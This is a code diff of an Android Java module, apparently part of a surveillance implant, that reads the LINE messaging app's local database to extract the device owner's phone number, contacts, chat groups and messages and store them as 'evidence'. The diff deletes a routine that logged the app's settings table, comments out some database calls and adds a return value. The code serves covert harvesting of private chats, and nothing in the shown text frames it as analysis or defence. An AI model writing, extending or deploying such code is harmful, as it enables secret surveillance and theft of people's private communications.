@@ -105,7 +105,7 @@ public class ChatLine extends SubModuleChat {
 
 	private String readMyPhoneNumber() {
 
-		SQLiteDatabase db = helper.getReadableDatabase();
+		//SQLiteDatabase db = helper.getReadableDatabase();
 
 		RecordHashPairVisitor visitorContacts = new RecordHashPairVisitor("m_id", "name");
 		helper.traverseRecords("contacts", visitorContacts);
@@ -133,30 +133,6 @@ public class ChatLine extends SubModuleChat {
 		}
 
 		return account;
-	}
-
-	private String readSettings() {
-		SQLiteDatabase db = helper.getReadableDatabase();
-
-		Cursor c = db.query("setting", null, null, null, null, null, null);
-
-		ArrayList<ContentValues> retVal = new ArrayList<ContentValues>();
-		ContentValues map;
-		if (c.moveToFirst()) {
-			do {
-				map = new ContentValues();
-				DatabaseUtils.cursorRowToContentValues(c, map);
-				retVal.add(map);
-				String key = map.getAsString("key");
-				String value = map.getAsString("value");
-
-				com.android.utils.ReverseLogging.d(key, " -> ", value);
-			} while (c.moveToNext());
-		}
-
-		c.close();
-		db.close();
-		return "";
 	}
 
 	@Override
@@ -226,6 +202,7 @@ public class ChatLine extends SubModuleChat {
 			long lastmessage = helper.traverseRawQuery(sqlquery, new String[] { Long.toString(lastLine) }, visitor);
 
 			getModule().saveEvidence(messages);
+			return lastmessage;
 
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
@@ -238,7 +215,7 @@ public class ChatLine extends SubModuleChat {
 	}
 
 	private ChatGroups getLineGroups(GenericSqliteHelper helper) {
-		SQLiteDatabase db = helper.getReadableDatabase();
+		//SQLiteDatabase db = helper.getReadableDatabase();
 		final ChatGroups groups = new ChatGroups();
 		RecordVisitor visitor = new RecordVisitor() {
 
